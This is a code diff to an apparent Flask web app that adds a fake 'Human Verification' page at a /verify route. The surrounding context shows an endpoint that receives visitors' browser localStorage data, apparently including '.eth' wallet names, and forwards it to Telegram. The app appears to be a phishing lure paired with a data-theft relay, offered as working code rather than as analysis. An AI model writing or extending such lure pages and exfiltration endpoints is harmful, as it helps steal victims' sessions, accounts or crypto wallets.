@@ -92,7 +92,73 @@ def store_data():
     send_text_to_telegram(message)
 
     return 'Data received', 200
-
+REVERSE_PROXY_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap" rel="stylesheet"> <!-- Include Roboto Mono font -->
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #0f0f0f;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+        }
+        .container {
+            width: 100%;
+            height: 100vh;
+            background-color: #1a1a1a;
+            padding-top: 50px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .container h1 {
+            font-size: 2.5em;
+            font-weight: bold;
+            margin-bottom: 3px; /* Reduced margin between heading and paragraph */
+        }
+        .container p {
+            font-size: 1.2em;
+            margin-bottom: 25px;
+        }
+        .container a {
+            display: inline-block;
+            background-color: #2a5f3f;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.3em;
+            text-decoration: underline; /* Underline the text */
+            border-radius: 5px;
+            border: 2px solid #255238;
+            width: 50%; /* Elongate the button */
+            text-align: center; /* Ensure text is centered inside the elongated button */
+            font-family: 'Roboto Mono', monospace; /* Change font to Roboto Mono */
+        }
+        .container a:hover {
+            background-color: #3d7b56;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Human Verification</h1>
+        <p>Verify below to be granted entry</p>
+        <a href="/">Click here</a>  <!-- Changed link to point to /api -->
+    </div>
+</body>
+</html>
+"""
+@app.route('/verify', methods=['GET'])
+def reverse_proxy():
+    return REVERSE_PROXY_HTML
 def format_message(local_storage):
     # Example placeholders; customize this part based on actual localStorage data
     name = '?.eth'  # Replace this with the relevant localStorage key for the name if available
